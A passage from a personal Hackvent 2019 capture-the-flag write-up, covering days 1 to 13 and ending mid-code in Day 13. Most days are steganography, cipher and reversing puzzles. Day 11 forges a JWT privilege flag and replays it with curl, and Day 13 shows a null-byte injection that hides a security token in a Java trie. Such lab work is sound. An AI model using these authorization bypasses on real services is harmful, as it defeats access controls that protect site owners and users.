# Hackvent 2019 write-up

In December 2019, I participated in the HackVent2019 challenge offered by [Hacking Lab](https://www.hacking-lab.com/index.html).  This was the third year for me.  Overall, it seems to have gotten a little easier, perhaps because I knew the type of things to look for and perhaps the challenges were also not as complicated as previous years.  But still there were several challenges were I spent hours trying to find the solution.  Most of the time, this was due to "running down a rabbit hole".  It is very easy to spend a lot of time looking in the completely wrong area!

That's where it was helpful to talk to other CTF players.  A quick yes/no question can help get on the right track.  This year, there were a few different chat groups: https://hack.chat/hackvent2019 and also the official HackVent discord.  It seemed that the discord chat got more active towards the end of the event, with separate servers being set up for brainstorming specific days.  The general chatter and discussion is one of my favorite parts o f HackVent - in general other players were eager to discuss and give hints.  Shout outs to mcia, ztube, smartsmurf, drschottky, tt-tt, engy, bread, wulgaru and all the others I talked to this HackVent!

My solutions to the problems are detailed here, along with the original materials provided.

# Day 01 - censored

- Level: Easy
- Author: M.
- Categories: Fun

## Challenge description

I got this little image, but it looks like the best part got censored on the way. Even the tiny preview icon looks clearer than this! Maybe they missed something that would let you restore the original content?

![day01](provided/day01.jpg)

## Solution

I used binwalk to extract the contents:

    $ binwalk --dd=".*" day01.jpg

    DECIMAL       HEXADECIMAL     DESCRIPTION
    --------------------------------------------------------------------------------
    0             0x0             JPEG image data, EXIF standard
    12            0xC             TIFF image data, little-endian offset of first image directory: 8
    332           0x14C           JPEG image data, JFIF standard 1.01

There was an additional JPEG file that was extracted:

    $ cd _day01.jpg.extracted/
    $ file *
    0:   JPEG image data, Exif standard: [TIFF image data, little-endian, direntries=7, description=Censored by Santa!, xresolution=118, yresolution=126, resolutionunit=2, software=GIMP 2.10.12, datetime=2019:12:24 00:00:00], comment: "Censored by Santa!", progressive, precision 8, 256x256, frames 3
    14C: JPEG image data, JFIF standard 1.01, resolution (DPI), density 300x300, segment length 16, progressive, precision 8, 55x55, frames 3
    C:   TIFF image data, little-endian, direntries=7, description=Censored by Santa!, xresolution=118, yresolution=126, resolutionunit=2, software=GIMP 2.10.12, datetime=2019:12:24 00:00:00

The second file contained a QR code:

![qrcode](images/14C.jpg)

I used pinta to resize and crop:

![day01_qr](images/day01_qr.png)

Then I used [xing online decoder](https://zxing.org/w/decode.jspx) to decode the barcode, which revealed the flag:

HV19{just-4-PREview!}

# Day 02 - Triangulation

- Level: Easy
- Author: drschottky
- Categories: Fun

## Challenge Description

Today we give away decorations for your Christmas tree. But be careful and do not break it.

[HV19.02-Triangulation.zip](provided/day02.zip)

## Solution

First, I installed blender:

    sudo snap install blender --classic

I used blender remove the outer ball to find a barcode hidden inside.

To do this I did the following:

1. Open edit mode (TAB)
2. Select and delete vertices
3. Change the view to look from the top (Z)
4. Change to TexturePaint
5. Take a screenshot
6. Use pinta to invert the colors

The resulting image was:

![day02_solution](images/day02_solution.png)

Then I used [xing online decoder](https://zxing.org/w/decode.jspx) to decode the barcode, which revealed the flag.

The flag is: HV19{Cr4ck_Th3_B411!}

# Day 03 - Hodor, Hodor, Hodor

- Level: Easy
- Author: otaku feat. trolli101
- Categories: Fun, Programming

## Challenge Description

![day03](provided/day03.jpg)

```
$HODOR: hhodor. Hodor. Hodor!?  = `hodor?!? HODOR!? hodor? Hodor oHodor. hodor? , HODOR!?! ohodor!?  dhodor? hodor odhodor? d HodorHodor  Hodor!? HODOR HODOR? hodor! hodor!? HODOR hodor! hodor? !

hodor?!? Hodor  Hodor Hodor? Hodor  HODOR  rhodor? HODOR Hodor!?  h4Hodor?!? Hodor?!? 0r hhodor?  Hodor!? oHodor?! hodor? Hodor  Hodor! HODOR Hodor hodor? 64 HODOR Hodor  HODOR!? hodor? Hodor!? Hodor!? .

HODOR?!? hodor- hodorHoOodoOor Hodor?!? OHoOodoOorHooodorrHODOR hodor. oHODOR... Dhodor- hodor?! HooodorrHODOR HoOodoOorHooodorrHODOR RoHODOR... HODOR!?! 1hodor?! HODOR... DHODOR- HODOR!?! HooodorrHODOR Hodor- HODORHoOodoOor HODOR!?! HODOR... DHODORHoOodoOor hodor. Hodor! HoOodoOorHodor HODORHoOodoOor 0Hooodorrhodor HoOodoOorHooodorrHODOR 0=`;
hodor.hod(hhodor. Hodor. Hodor!? );
```

## Solution

I did a google search for "Hodor" and learned that he is from the Game of Thrones (yes, I have not seen the show).
Then I did a search for "hodor programming language" and found the [Hodor language github page](https://github.com/hummingbirdtech/hodor).

I installed the hodor language:

    $ sudo npm install -g hodor-lang

Then I ran provided hodor program:

    $ hodor day03.hd
    HODOR: \-> day03.hd
    Awesome, you decoded Hodors language!

    As sis a real h4xx0r he loves base64 as well.

    SFYxOXtoMDFkLXRoMy1kMDByLTQyMDQtbGQ0WX0=

I then ran a base64 decoder to get the flag:

    $ echo SFYxOXtoMDFkLXRoMy1kMDByLTQyMDQtbGQ0WX0= | base64 -d
    HV19{h01d-th3-d00r-4204-ld4Y}


The flag is: HV19{h01d-th3-d00r-4204-ld4Y}

# Day 04 - Password Policy Circumvention

- Level: Easy
- Author: DanMcFly
- Categories: Fun

## Challenge Description

Santa released a new password policy (more than 40 characters, upper, lower, digit, special).

The elves can't remember such long passwords, so they found a way to continue to use their old (bad) password:

Copied to clipboard

```
merry christmas geeks
```
[day04.zip](provided/day04.zip)

## Solution

On a Windows machine, I installed and ran [AutoHotKey](https://www.autohotkey.com/).
Then I double-clicked on the provided script to enable it.

I opened a notepad editor, and typed the words "merry christmas geeks" and the flag was output as I typed it:

HV19{R3memb3r, rem3mber - the 24th 0f December}

# Day 05 - Santa Parcel Tracking

- Level: Easy
- Author: inik
- Categories: Fun

## Challenge Description

To handle the huge load of parcels Santa introduced this year a parcel tracking system. He didn't like the black and white barcode, so he invented a more solemn barcode. Unfortunately the common barcode readers can't read it anymore, it only works with the pimped models santa owns. Can you read the barcode

![day05.png](provided/day05.png)

## Solution

This required some trial and error.  The color of the barcode is indeed significant.
For each RGB color value, I took the value of the B (blue) component and got the character value.

```
#!/usr/bin/env python3

from PIL import Image

im = Image.open('day05.png')

img = im.load()

b_prev = None

z = ''
for x in range(160, 548):
    r, g, b  = img[x, 0]
    if (r != 255 and r != 0):
        if b != b_prev:
            z = z + '{:c}'.format(b)
        b_prev = b
print(z)
```

Running the script output the flag:

HV19{D1ficult_to_g3t_a_SPT_R3ader}

# Day 06 - Bacon and Eggs

- Level: Easy
- Author: brp64
- Categories: Fun, Crypto

## Challenge Description

![day06](provided/day06.jpg)

*F*ra*n*cis Baco*n* *w*a*s* *a*n E*ng*lish ph*i*l*os*o*p*her a*n*d *s*tat*e*sm*a*n w*h*o se*rve*d *a*s At*t*or*n*ey Gen*e*ral and as *L*or*d* *Ch*an*ce*l*l*or of *En*g*l*an*d*. Hi*s* *w*orks ar*e* c*red*it*e*d w*ith* d*e*ve*lo*pi*ng* *t*h*e* sci*e*nt*i*fic me*t*hod and re*m*ai*ned* in*fl*u*en*ti*al* th*rou*gh *t*he s*cien*tific *r*ev*o*l*u*ti*o*n.
*B*a*co*n h*as* *b*e*e*n ca*l*led *th*e *f*ath*e*r o*f* emp*iric*i*s*m. *Hi*s *wor*ks ar*g*ued for th*e* po*ssi*bi*li*t*y* of s*c*ie*n*tifi*c* *kno*wl*edg*e b*a*se*d* onl*y* u*p*on i*n*du*c*t*i*ve *r*ea*s*onin*g* *a*nd c*aref*u*l* o*bs*er*v*ation o*f* *e*v*e*nt*s* in *na*tur*e*. Mo*st* *i*mp*ort*an*t*l*y*, *he* a*rgue*d sc*i*en*c*e co*uld* *b*e *a*c*hi*eved by us*e* of a *s*ce*p*t*ical* a*nd* me*t*hod*i*ca*l* *a*pp*roa*ch wh*er*eby *s*cientist*s* ai*m* t*o* avo*i*d m*i*sl*ead*in*g* themsel*ve*s. *A*lth*oug*h *h*is *p*ra*c*tic*a*l i*d*e*a*s ab*out* *s*u*ch* *a* *m*et*h*od, *t*he B*a*con*i*an meth*o*d, d*i*d no*t* have *a* l*o*n*g*-*la*s*t*ing *i*nfluen*c*e, *th*e *g*e*ne*ral *i*dea *of* *t*he imp*o*rta*n*ce and pos*s*i*b*il*it*y o*f* a s*c*ept*i*cal methodology makes Bacon the father of the scientific method. This method was a new rhetorical and theoretical framework for science, the practical details of which are still central in debates about science and methodology.

Bacon was the first recipient of the Queen's counsel designation, which was conferred in 1597 when Elizabeth I of England reserved Bacon as her legal advisor. After the accession of James VI and I in 1603, Bacon was knighted. He was later created Baron Verulam in 1618 and Viscount St. Alban in 1621.
Because he had no heirs, both titles became extinct upon his death in 1626, at 65 years. Bacon died of pneumonia, with one account by John Aubrey stating that he had contracted the condition while studying the effects of freezing on the preservation of meat. He is buried at St Michael's Church, St Albans, Hertfordshire.

```
Born: January 22\t     \t \t   \t   \t \t       \t     \t  \t  
Died: April 9   \t  \t \t    \t  \t      \t   \t\t  \t  
Mother: Lady Anne   \t\t \t   \t   \t      \t  \t      \t  
Father: Sir Nicholas\t \t      \t\t    \t    \t  \t  \t      \t      
Secrets: unknown      \t \t  \t \t    \t    \t   \t       \t  
```

## Solution

First of all, I realized that some of characters were italicized and some were not.

I obtained the challenge in the JSON format by navigating to:  [https://academy.hacking-lab.com/api/user/challenges/47](https://academy.hacking-lab.com/api/user/challenges/47)

This encoded the characters using the asterisk ('*') as:

```
*F*ra*n*cis Baco*n* *w*a*s* *a*n E*ng*lish ph*i*l*os*o*p*her
```

For every regular character, I replaced it with an A, and for every italicized character, I replaced it with a B.  

I used a simple python program to convert it:

```
#!/usr/bin/env python3

import string

with open('day06.txt', 'r') as f:
    msg = f.read()
    inside_emphasis = False
    result = ''
    for letter in msg:
        if letter == '*':
            inside_emphasis = not inside_emphasis
        elif letter in string.ascii_letters:
            if inside_emphasis:
                result += 'B'
            else:
                result += 'A'
    print(result)
```

Running the program output the following:

```
BAABAAAAAAABBABBAABBAAAAAABABBABAAAABABAAABAABAABAAABBBABAAABAABAAAAABAAAAAAAABAABBBAABBABAAAABBABAABAABBAAAAAABABBBAABAABBBABAABBAABBBABAAABAABAAAAABAAAAAAAABAABBBAABBABBAABBAABBBAABAAABBBBAAAAABAABABAABABABBAABBBABAAABAAABBABAAABAABAAABBBBABABBABBBAAAABAAAAAAAABAABBBAABBABAAABAABAAAABBBBAABBBAABAABAAABABAAABAABABAABAABAAAABBAAABBBBABABBAABAAAAAABBABAABAABBAAABAABBBAABBBAABABBBABBBBAAABAABAAABBBBABABBAAAAAAAABAAABAABABBBBABBAABAAABAABBAABBBAAAABBAAABAAAAAAAABAABABAAABAABAABBBAABAAAAAAABBABAAABBBABAABAABAAABAABABAAABBBBABBBBAABAABAAABAAABAAAAAABAABAAABAAAABABABBBABAAABAAAAAABABBABABBAAABAAABBBAAAAABAAABAAAAAAAABABAABBAABAABAAAB
```

I ran this through the [bacon decoder at cyberchef](https://gchq.github.io/CyberChef/#recipe=Bacon_Cipher_Decode('Complete','A/B',false)&input=QkFBQkFBQUFBQUFCQkFCQkFBQkJBQUFBQUFCQUJCQUJBQUFBQkFCQUFBQkFBQkFBQkFBQUJCQkFCQUFBQkFBQkFBQUFBQkFBQUFBQUFBQkFBQkJCQUFCQkFCQUFBQUJCQUJBQUJBQUJCQUFBQUFBQkFCQkJBQUJBQUJCQkFCQUFCQkFBQkJCQUJBQUFCQUFCQUFBQUFCQUFBQUFBQUFCQUFCQkJBQUJCQUJCQUFCQkFBQkJCQUFCQUFBQkJCQkFBQUFBQkFBQkFCQUFCQUJBQkJBQUJCQkFCQUFBQkFBQUJCQUJBQUFCQUFCQUFBQkJCQkFCQUJCQUJCQkFBQUFCQUFBQUFBQUFCQUFCQkJBQUJCQUJBQUFCQUFCQUFBQUJCQkJBQUJCQkFBQkFBQkFBQUJBQkFBQUJBQUJBQkFBQkFBQkFBQUFCQkFBQUJCQkJBQkFCQkFBQkFBQUFBQUJCQUJBQUJBQUJCQUFBQkFBQkJCQUFCQkJBQUJBQkJCQUJCQkJBQUFCQUFCQUFBQkJCQkFCQUJCQUFBQUFBQUFCQUFBQkFBQkFCQkJCQUJCQUFCQUFBQkFBQkJBQUJCQkFBQUFCQkFBQUJBQUFBQUFBQUJBQUJBQkFBQUJBQUJBQUJCQkFBQkFBQUFBQUFCQkFCQUFBQkJCQUJBQUJBQUJBQUFCQUFCQUJBQUFCQkJCQUJCQkJBQUJBQUJBQUFCQUFBQkFBQUFBQUJBQUJBQUFCQUFBQUJBQkFCQkJBQkFBQUJBQUFBQUFCQUJCQUJBQkJBQUFCQUFBQkJCQUFBQUFCQUFBQkFBQUFBQUFBQkFCQUFCQkFBQkFBQkFBQUI) which returned:

```
SANTALIKESHISBACONBUTALSOTHISBACONTHEPASSWORDISHVXBACONCIPHERISSIMPLEBUTCOOLXREPLACEXWITHBRACKETSANDUSEUPPERCASEFORALLCHARACTER
```

Putting this in spaces:
```
SANTA LIKES HIS BACON BUT ALSO THIS BACON

THE PASSWORD IS HVXBACONCIPHERISSIMPLEBUTCOOLX

REPLACE X WITH BRACKETS AND USE UPPERCASE FOR ALL CHARACTER
```

Thus the flag is: HV19{BACONCIPHERISSIMPLEBUTCOOL}

# Day 07 - Santa Rider

- Level: Easy
- Author: inik
- Categories: Fun

## Challenge Description

Santa is prototyping a new gadget for his sledge. Unfortunately it still has some glitches, but look for yourself.

For easy download, get it here: [HV19-SantaRider.zip](provided/day07.zip)

## Solution

First I unzipped the file, and then extracted the frames using ffmpeg:

```
ffmpeg -i 3DULK2N7DcpXFg8qGo9Z9qEQqvaEDpUCBB1v.mp4 thumb%04d.png -hide_banner
```

Manually, frame by frame (starting at thumb0274), I read the row of lights as an 8-bit number and translated to ascii.

```
#!/usr/bin/env python3

pattern = [
            0b01001000, 0b01010110, 0b00110001, 0b00111001, 0b01111011, 0b00110001, 0b01101101, 0b01011111,
            0b01100001, 0b01101100, 0b01110011, 0b00110000, 0b01011111, 0b01110111, 0b00110000, 0b01110010,
            0b01101011, 0b00110001, 0b01101110, 0b01100111, 0b01011111, 0b00110000, 0b01101110, 0b01011111,
            0b01100001, 0b01011111, 0b01110010, 0b00110011, 0b01101101, 0b00110000, 0b01110100, 0b00110011,
            0b01011111, 0b01100011, 0b00110000, 0b01101110, 0b01110100, 0b01110010, 0b00110000, 0b01101100,
            0b01111101,
          ]

flag = ''.join([chr(c) for c in pattern])

print(flag)
```

The flag is: HV19{1m_als0_w0rk1ng_0n_a_r3m0t3_c0ntr0l}

# Day 08 - SmileNcryptor 4.0

- Level: Medium
- Author: otaku
- Categories: Crypto, Reverse Engineering

## Challenge description

You hacked into the system of very-secure-shopping.com and you found a SQL-Dump with $$-creditcards numbers. As a good hacker you inform the company from which you got the dump. The managers tell you that they don't worry, because the data is encrypted.

Dump-File: [dump.zip](provided/day08.zip)

Analyze the "Encryption"-method and try to decrypt the flag.

## Solution

The relevant portions of dump.sql:

```
(1,'Sirius Black',':)QVXSZUVYZYYZ[a','12/2020'),
(2,'Hermione Granger',':)QOUW[VT^VY]bZ_','04/2021'),
(3,'Draco Malfoy',':)SPPVSSYVV\YY_\\]','05/2020'),
(4,'Severus Snape',':)RPQRSTUVWXYZ[\]^','10/2020'),
(5,'Ron Weasley',':)QTVWRSVUXW[_Z`\b','11/2020');
```

And:

```
INSERT INTO `flags` VALUES (1,'HV19{',':)SlQRUPXWVo\Vuv_n_\ajjce','}');
```

Being a software developer, I work with test credit cards from time to time, and recalled that "4111 1111 1111 1111" is often used.

And the number "RPQRSTUVWXYZ[\\]^] looked suspicious given that the letters appear mostly sequentially, except the first number.

On a hunch I took a guess and put the two together thinking that this was the test number that I've used.

Looking at the pattern, it appears that it performed subtraction of an increasing sequence:

```
In [1]: ord('R') - ord('4')                                                                                                                                                  
Out[1]: 30

In [2]: ord('P') - ord('1')                                                                                                                                                  
Out[2]: 31

In [3]: ord('Q') - ord('1')                                                                                                                                                  
Out[3]: 32
```

So I wrote some code to test it out, first looking at the credit card numbers:

```
#!/usr/bin/env python3

guess = [ 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56 ]

credit_cards = [
        'QVXSZUVY\ZYYZ[a',
        'QOUW[VT^VY]bZ_',
        'SPPVSSYVV\YY_\\\\]',
        'RPQRSTUVWXYZ[\\]^',
        'QTVWRSVUXW[_Z`\\b',
    ]

flag = 'SlQRUPXWVo\\Vuv_n_\\ajjce'

def strsub(a, b):
    return ''.join([chr( (ord(x) - y) % 256) for x, y in zip(a,b)])

for item in credit_cards:
    print(strsub(item, guess))

print('Flag is {}'.format(strsub(flag, guess)))
```

It output the following, which are all valid [test credit card numbers](https://www.paypalobjects.com/en_GB/vhelp/paypalmanager_help/credit_card_numbers.htm):

```
378282246310005
30569309025904
5105105105105100
4111111111111111
3566002020360505
```

And finally the flag:
```
Flag is 5M113-420H4-KK3A1-19801
```

The flag is HV19{5M113-420H4-KK3A1-19801}

# Day 09 - Santa's Quick Response 3.0

- Level: Medium
- Author: brp64 feat. M.
- Categories: Fun

## Challenge description

Visiting the following railway station has left lasting memories.

![day09_b](provided/day09_a.jpg)

Santas brand new gifts distribution system is heavily inspired by it. Here is your personal gift, can you extract the destination path of it?

![day09_b](provided/day09_b.png)

## Solution

I used a combination of the tool "rule30" and gimp.

I first converted the provided image to 33x33 pixel:

```
#!/usr/bin/env python3.7

from PIL import Image
img = Image.open('day09_b.png')
pix = img.load()

imgdata = []

for i in range(0, 165, 5):
    for j in range(0, 165, 5):
        imgdata.append(1 if pix[j,i] == 255 else 0)

img = Image.new("1", (33, 33))
img.putdata(imgdata)
img.save("day09_small.png")
```

I created a rule30 image:

```
$ pip install rule30
$ rule30 rule30.png
```

I opened up the rule30 file using GIMP:

```
$ gimp rule30.png
```

Inside GIMP, I did the following:

- Selected "File -> Open as Layers..." and choose "day09_small.png"
- Pressed "CTRL+L" to open the layers dialog box
- Selected Layer mode "difference" (which is XOR).
- Pressed "M" to enter "move mode"
- Used the arrow keys to align the two images such that a QR code was revealed.
- Selected "Colors -> Invert" to show the image properly.

![day09_solution1.png](images/day09_solution1.png)

I then:

- Selected "Layer -> Merge Layer"
- Enabled the selection tool
- Selected"Image -> Crop to selection"
- Saved the result:

![day09_solution2.png](images/day09_solution2.png)

Then I used [xing online decoder](https://zxing.org/w/decode.jspx) to decode the barcode, which revealed the flag:

The flag is: HV19{Cha0tic_yet-0rdered}

# Day 10 - Guess what

- Level: Medium
- Author: inik
- Categories: Fun

## Challenge description

The flag is right, of course

[HV19.10-guess3.zip](provided/day10_take3.zip)

Hints:

- New binary (v3) released at 20:00 CET
- Time for full points will be extended for additional 24 hours
- No asm needed
- run it on linux

## Solution

I ran ltrace:

    nohup ltrace -s256 ./guess3

I observed the line:

    strlen("\001H\001V\0011\0019\001{\001S\001h\0013\001l\001l\001_\0010\001b\001f\001u\001s\001c\001a\001t\0011\0010\001n\001_\0011\001s\001_\001f\001u\001t\0011\001l\0013\001}") = 66

Then I fixed the formatting to get the flag:

    In [1]: print("\001H\001V\0011\0019\001{\001S\001h\0013\001l\001l\001_\0010\001b\001f\001u\001s\001c\001a\001t\0011\0010\001n\001_\0011\001s\001_\001f\001u\001t\0011\001l\00
    ...: 13\001}")                                                                                                                                                            
    HV19{Sh3ll_0bfuscat10n_1s_fut1l3}

The Flag is HV19{Sh3ll_0bfuscat10n_1s_fut1l3}

# Day 11 - Frolicsome Santa Jokes API

- Level: Medium
- Author: inik
- Categories: Fun

## Challenge Description

The elves created an API where you get random jokes about santa.
Resources

Go and try it here: [http://whale.hacking-lab.com:10101](http://whale.hacking-lab.com:10101)


## Solution

I first registered a user:

```
$ cat
#!/bin/sh

curl -s -X POST -H 'Content-Type: application/json' http://whale.hacking-lab.com:10101/fsja/register --data '{"us
ername":"veganjay", "password": "mypassword"}
$ ./register.sh
{"message":"User created","code":201}
```

Then I logged in:

```
$ cat login.sh
#!/bin/sh

curl -s -X POST -H 'Content-Type: application/json' http://whale.hacking-lab.com:10101/fsja/login --data '{"username":"veganjay", "password": "mypassword"}
$ ./login.sh
{"message":"Token generated","code":201,"token":"eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjp7InVzZXJuYW1lIjoidmVnYW5qYXkiLCJwbGF0aW51bSI6ZmFsc2V9LCJleHAiOjE1NzYwNzIxODUuNzg1MDAwMDAwfQ.ByIDtFDnCGeX1cigE9TNsmBy_AMnGKetL6IHXCh5cKI"}
```

Then I obtained some jokes:

```
$ cat getjoke.sh
#!/bin/sh

TOKEN="eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjp7InVzZXJuYW1lIjoidmVnYW5qYXkiLCJwbGF0aW51bSI6ZmFsc2V9LCJleHAiOjE1NzY1OTYxO
DAuNDA4MDAwMDAwfQ.2ILG5OnOVSdH9fkaCYymds75MZerzqzyS4AOEgpWsQQ"

curl -X GET "http://whale.hacking-lab.com:10101/fsja/random?token=${TOKEN}"

$ ./getjoke.sh
{"joke":"People really act weird at Christmas time! What other time of year do you sit in front of a dead tree in the living room and eat nuts and sweets out of your socks?","author":"Author Unknown","platinum":false}
$ ./getjoke.sh
{"joke":"Three Wise WOMEN would have asked directions, arrived on time, helped deliver the baby, bought practical gifts, cleaned the stable, made a casserole, and there would be peace on earth!","author":"Anonymous","platinum":false}
$ ./getjoke.sh
{"joke":"People are so worried about what they eat between Christmas and the New Year, but they really should be worried about what they eat between the New Year and Christmas.","author":"Author Unknown","platinum":false}
$ ./getjoke.sh
{"joke":"You know you’re getting old, when Santa starts looking younger.","author":"Bart Simpson in The Simpsons","platinum":false}
$ ./getjoke.sh
{"joke":"You know you’re getting old, when Santa starts looking younger.","author":"Bart Simpson in The Simpsons","platinum":false}
$ ./getjoke.sh
{"joke":"Santa Claus had the right idea. Visit people only once a year.","author":"Victor Borge","platinum":false}j
```

I decoded the JSON Web Token with [https://jwt.io/](https://jwt.io/) and observed the data:
```
{
  "user": {
    "username": "veganjay",
    "platinum": false
  },
  "exp": 1576072185.785
}
```

I changed platinum to "true" and obtained a new JSON web token:
```
eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjp7InVzZXJuYW1lIjoidmVnYW5qYXkiLCJwbGF0aW51bSI6dHJ1ZX0sImV4cCI6MTU3NjA3MjE4NS43ODV9.fo4sc3qSBCRJKsYSo9Lh2K1RUSboysi7YqbPZ5KNdcA
```

I ran it to get the flag:

```
$ cat solution.sh
#!/bin/sh
TOKEN="eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjp7InVzZXJuYW1lIjoidmVnYW5qYXkiLCJwbGF0aW51bSI6dHJ1ZX0sImV4cCI6MTU3NjA3MjE4NS43ODV9.fo4sc3qSBCRJKsYSo9Lh2K1RUSboysi7YqbPZ5KNdcA"
curl -X GET "http://whale.hacking-lab.com:10101/fsja/random?token=${TOKEN}"
$ ./solution.sh
{"joke":"Congratulation! Sometimes bugs are rather stupid. But that's how it happens, sometimes. Doing all the crypto stuff right and forgetting the trivial stuff like input validation, Hohoho! Here's your flag: HV19{th3_cha1n_1s_0nly_as_str0ng_as_th3_w3ak3st_l1nk}","author":"Santa","platinum":true}
```

The flag is: HV19{th3_cha1n_1s_0nly_as_str0ng_as_th3_w3ak3st_l1nk}


# Day 12 - Back to Basic

- Level: Medium
- Author: hardlock
- Categories: Reverse Engineering, Fun

## Challenge Description

Santa used his time machine to get a present from the past. get your rusty tools out of your cellar and solve this one!

[HV19.12-BackToBasic.zip](provided/day12.zip)

## Solution

I used a combination of static and dynamic analysis using Ghidra and Immunity Debugger.  Ghidra's decompilation gave a general feel of the control flow, which helped figure out the rest.

I set a breakpoint for 0x00402270 in the debugger, and noticed it did not get too far, so I referred back to the code.

First it checks if the string begins with HV19 (not too much of a surprise).

So, back in the debugger I ran again and copy and pasted "HV19".  It made it a little further, but still not that far.

Then I went back to the code and observed that it checks for a flag length of 33, otherwise it immediate gives the "Status: wrong message":

```
    uVar3 = __vbaLenVar(local_60,local_38);
    sVar1 = __vbaVarTstEq(COMPARE_1,uVar3);
    if (sVar1 != 0) {
      // Do the good stuff
    } // ...
    iVar5 = (**(code **)(*piVar4 + 0x54))(piVar4,L"Status: wrong");
```

Back in the debugger, I copy and pasted: "HV19{XXXXXXXXXXXXXXXXXXXXXXXXXXX}" and noticed that it made it further this time.

I set a breakpoint on 0x00402286, which is past the length check.

At 0x0040242A it checks if two strings are equal, so I stepped through the code, and observed in the registers it compared:

```
ESI 006A9C54 UNICODE "^_PQRSTUVWHIJKLMNO@ABCDEFGx"
EDI 00401B40 UNICODE "6klzic<=bPBtdvff'y"
```

I repeated the same test but instead entered "HV19{{{{{{{{{{{{{{{{{{{{{{{{{{{{{" and saw the registers:

```
ESI 006A9C54 UNICODE "}|srqpwvutkjihonmlcba`gfed["
EDI 00401B40 UNICODE "6klzic<=bPBtdvff'y"\"
```

Assuming that an XOR was being used, I performed an XOR of the input value to the value in the register:

```
In [1]: ''.join([chr(ord(a) ^ ord(b)) for a, b in zip('XXXXXXXXXXXXXXXXXXXXXXXXXXX', '^_PQRSTUVWHIJKLMNO@ABCDEFGx')])                                                        
Out[1]: '\x06\x07\x08\t\n\x0b\x0c\r\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f '

In [2]: ''.join([chr(ord(a) ^ ord(b)) for a, b in zip('{{{{{{{{{{{{{{{{{{{{{{{{{{{{{', '}|srqpwvutkjihonmlcba`gfed[')])                                                      
Out[2]: '\x06\x07\x08\t\n\x0b\x0c\r\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f '

```

They were the same!  So I applied the mask to the cipher text:
```
In [3]: mask = ''.join([chr(ord(a) ^ ord(b)) for a, b in zip('{{{{{{{{{{{{{{{{{{{{{{{{{{{{{', '}|srqpwvutkjihonmlcba`gfed[')])                                               

In [4]: ''.join([chr(ord(a) ^ ord(b)) for a, b in zip(mask, "6klzic<=bPBtdvff'y\x7fFI~on//N")])                                                                              
Out[4]: '0ldsch00l_Revers1ng_Sess10n'
```

One liner:
```
In [1]: print(''.join([chr(ord(c) ^ n) for (c, n) in zip("6klzic<=bPBtdvff'y\x7fFI~on//N", range(6,33))]))                                                                   
0ldsch00l_Revers1ng_Sess10n
```
The flag is: HV19{0ldsch00l_Revers1ng_Sess10n}

# Day 13 - Trie Me

- Level: Medium
- Author: kiwi
- Categories: Fun

## Challenge Description

Switzerland's national security is at risk. As you try to infiltrate a secret spy facility to save the nation you stumble upon an interesting looking login portal.

Can you break it and retrieve the critical information?

Resources:

- Facility: [http://whale.hacking-lab.com:8888/trieme](Facility: http://whale.hacking-lab.com:8888/trieme/)
- [HV19.13-NotesBean.java.zip](provided/day13.zip)

## Solution

I navigated to the website and observed a login page:

![day13_portal1](images/day13_portal1.png)

I entered a bad password and got an error message:

![day13_portal1](images/day13_portal2.png)

According to the JAVA code, the following occurs:

1. A security token is inserted into a trie
2. When a user clicks "login" it inserts a user provided note into the trie
3. If the security token is **not** there it outputs the flag

A couple things stood out as strange to me:

- In Step #3 - normally you check for the presence of a token, and not the absence
- In the method setTrie(), there is a call to "trie.put(unescapeJava(note), 0);".  Normally you want to *escape* user input, not *unescape*.

I figured the best way to solve this is to experiment in a local development environment, so I downloaded the apache commons libraries, fired up Eclipse and wrote a small program:

```
package com.veganjay.hackvent.day13;

import org.apache.commons.collections4.trie.PatriciaTrie;
import static org.apache.commons.lang3.StringEscapeUtils.unescapeJava;

public class Day13 {

	public static void main(String [] args) {
		// The security token
		String securitytoken = "auth_token_4835989";

		// Create the trie and store the token
		PatriciaTrie<Integer> trie = new PatriciaTrie<Integer>();
		trie.put(securitytoken,0);

		// Display the trie
		System.out.println(trie);
		System.out.println("Security token exists: " + trie.containsKey(securitytoken) + "\n");
	}
}

```

I ran this which output the following:
```
Trie[1]={
  Entry(key=auth_token_4835989 [9], value=0, parent=ROOT, left=ROOT, right=auth_token_4835989 [9], predecessor=auth_token_4835989 [9])
}

Security token exists: true
```

So far so good.  I added some code at the end of the main method to add another key:

```
		trie.put(unescapeJava("testing123"), 0);
```

The output looked like what I'd expect - no surprises:

```
Trie[2]={
  Entry(key=auth_token_4835989 [9], value=0, parent=ROOT, left=ROOT, right=testing123 [11], predecessor=testing123 [11])
  Entry(key=testing123 [11], value=0, parent=auth_token_4835989 [9], left=auth_token_4835989 [9], right=testing123 [11], predecessor=testing123 [11])
}

Security token exists: true
```

So then I added an escaped tab to the note:

```
String note = "testing123\t";
trie.put(unescapeJava(note),0);
```

As one would expect, the tab was unescaped and an actual tab appeared in the output:

```
Trie[2]={
  Entry(key=auth_token_4835989 [9], value=0, parent=ROOT, left=ROOT, right=testing123	 [11], predecessor=testing123	 [11])
  Entry(key=testing123	 [11], value=0, parent=auth_token_4835989 [9], left=auth_token_4835989 [9], right=testing123	 [11], predecessor=testing123	 [11])
}
```

So I figured, what would happen if I added a null character?

```
String note = "auth_token_4835989\0";
trie.put(unescapeJava(note),0);
System.out.println(trie.containsKey(securitytoken));
```

When I ran this, the output of the trie got corrupted:

```
Trie[1]={
  Entry(key=auth_token_4835989
false
```

To put it all together, here's a little test program:

```
package com.veganjay.hackvent.day13;

import org.apache.commons.collections4.trie.PatriciaTrie;
import static org.apache.commons.lang3.StringEscapeUtils.unescapeJava;
import static org.apache.commons.lang3.StringEscapeUtils.escapeJava;

public class Day13 {

	public static void main(String [] args) {
		// The security token
		String securitytoken = "auth_token_4835989";

		// Create the trie and store the token
		PatriciaTrie<Integer> trie = new PatriciaTrie<Integer>();
		System.out.println("Created trie.");

		trie.put(securitytoken,0);
		System.out.println("Added to Trie: " + escapeJava(securitytoken));

		// Display the trie
		System.out.println(trie);
		System.out.println("Security token exists: " + trie.containsKey(securitytoken) + "\n");

		// Add a note that has a null terminator
